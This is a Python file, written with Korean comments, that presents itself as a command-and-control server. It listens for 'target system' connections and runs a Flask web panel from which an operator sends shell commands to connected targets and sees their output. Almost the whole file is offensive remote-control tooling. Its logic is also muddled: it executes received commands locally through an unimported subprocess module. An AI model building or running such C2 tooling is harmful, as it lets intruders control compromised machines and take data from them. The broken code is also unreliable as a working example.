# c2_server.py (C2 서버 코드)

from flask import Flask, render_template_string, request, jsonify
import socket
import threading
import json

app = Flask(__name__)

# 연결된 타겟 시스템 저장
connected_targets = {}

# 타겟 시스템과 연결을 처리하는 함수
def handle_target_connection(client_socket, target_id):
    print(f"타겟 시스템 {target_id} 연결됨.")
    while True:
        try:
            # 명령어를 클라이언트로부터 받음
            command = client_socket.recv(1024).decode('utf-8')
            if not command:
                break

            # 명령어 실행
            result = execute_command(command)
            
            # 명령어 실행 결과를 클라이언트로 전송
            client_socket.send(json.dumps(result).encode('utf-8'))
        except Exception as e:
            print(f"타겟 시스템 {target_id} 오류: {e}")
            break

    client_socket.close()
    del connected_targets[target_id]
    print(f"타겟 시스템 {target_id} 연결 종료됨.")

# 명령어 실행 함수
def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return {
            'stdout': result.stdout,
            'stderr': result.stderr,
            'returncode': result.returncode
        }
    except Exception as e:
        return {'stdout': '', 'stderr': str(e), 'returncode': 1}

# 타겟 시스템과의 연결을 받아 처리하는 함수
def accept_connections():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 5001))  # 모든 IP에서 접속을 허용
    server_socket.listen(5)

    print("타겟 시스템 연결 대기 중...")
    while True:
        client_socket, addr = server_socket.accept()
        print(f"타겟 시스템 연결됨: {addr}")
        
        # 타겟 시스템 ID (혹은 IP)를 생성하여 연결된 타겟을 구분
        target_id = addr[0]
        
        # 연결된 타겟을 저장
        connected_targets[target_id] = client_socket
        
        # 새로운 스레드로 타겟 시스템을 처리
        threading.Thread(target=handle_target_connection, args=(client_socket, target_id)).start()

# Flask 웹 인터페이스
@app.route('/')
def index():
    return render_template_string(open('index.html').read(), targets=connected_targets)

@app.route('/execute', methods=['POST'])
def execute():
    target_id = request.form.get('target_id')
    command = request.form.get('command')

    if target_id in connected_targets:
        client_socket = connected_targets[target_id]
        client_socket.send(command.encode('utf-8'))

        # 명령어 실행 결과 받기
        result = client_socket.recv(4096).decode('utf-8')
        return render_template_string(open('index.html').read(), result=result, targets=connected_targets)
    
    return render_template_string(open('index.html').read(), result="타겟이 연결되지 않았습니다.", targets=connected_targets)

if __name__ == "__main__":
    # 타겟 시스템과의 연결을 수락하는 스레드 시작
    threading.Thread(target=accept_connections, daemon=True).start()
    
    # Flask 서버 실행
    app.run(debug=True, host='0.0.0.0', port=3578)
